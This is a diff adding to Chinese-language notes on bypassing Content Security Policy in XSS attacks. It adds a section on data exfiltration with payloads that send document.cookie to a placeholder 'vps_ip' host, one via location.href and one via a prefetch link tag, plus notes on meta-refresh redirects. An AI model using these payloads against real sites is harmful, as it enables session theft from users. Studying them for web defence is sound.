@@ -48,6 +48,35 @@ script-src 中 strict-dynamic 中的作用:
 
 
 
+### 外带数据
+
+
+
+
+
+#### location.href
+
+> CSP不影响location.href跳转，因为当今大部分网站的跳转功能都是由前端实现的，CSP如果限制跳转会影响很多的网站功能。所以，用跳转来绕过CSP获取数据是一个万能的办法，虽然比较容易被发现，但是在大部分情况下对于我们已经够用 
+
+`location.href = "vps_ip:xxxx?"+document.cookie`
+
+#### link标签
+
+```javascript
+var link = document.createElement("link");
+link.setAttribute("rel", "prefetch");
+link.setAttribute("href", "//vps_ip/?" + document.cookie);
+document.head.appendChild(link);
+```
+
+csp3对link标签有约束了，可能打不通
+
+#### 利用没有csp保护的网页
+
+
+
+
+
 ### 利用302跳转
 
 ` Content-Security-Policy: default-src 'self '; script-src http://127.0.0.1/static/`
@@ -67,6 +96,19 @@ Static/302.php
 ```
 <script src="static/302.php?url=upload/test.jpg">
 ```
+
+### meta 标签跳转
+
+
+
+```
+<meta http-equiv="refresh" content="3;url=https://www.mozilla.org">
+如果 content 只包含一个正整数,则是重新载入页面的时间间隔(秒);
+如果 content 包含一个正整数并且跟着一个字符串 ';url=' 和一个合法的 URL，则是重定向到指定链接的时间间隔(秒)
+可及性的考虑
+```
+
+
 
 
 
@@ -223,7 +265,7 @@ script[nonce^="b"]:after { content: url("record?b") }
 
 [前端防御从入门到弃坑--CSP变迁](https://paper.seebug.org/423/)
 
-
+ https://xz.aliyun.com/t/5084 
 
 
 
